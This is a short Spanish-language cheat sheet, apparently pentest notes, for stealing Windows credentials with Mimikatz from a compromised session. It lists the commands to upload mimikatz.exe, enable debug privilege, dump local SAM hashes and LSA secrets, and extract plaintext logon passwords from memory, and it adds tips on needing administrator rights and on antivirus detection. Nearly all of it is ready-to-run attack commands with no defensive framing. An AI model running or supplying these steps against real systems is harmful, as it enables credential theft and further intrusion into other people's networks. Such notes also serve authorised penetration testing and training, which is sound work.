Herramienta para extraer credenciales en texto claro, hashes y secretos del sistema.

• Obtiene contraseñas en memoria  
• Extrae hashes del sistema  
• Requiere privilegios elevados

## Subir Mimikatz

```
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

## Ejecutar Mimikatz

```
shell  
mimikatz.exe
```

## Activar privilegios

	privilege::debug

## Dump de SAM

Obtiene hashes de usuarios locales.

	lsadump::sam

## Dump de secretos

Extrae secretos del sistema (LSA).

	lsadump::secrets

## Credenciales en memoria

Obtiene passwords en texto claro (si están en memoria).

	sekurlsa::logonpasswords


• Ejecutar como administrador  
• privilege::debug es obligatorio  
• sekurlsa funciona si hay sesiones activas  
• Puede ser detectado por antivirus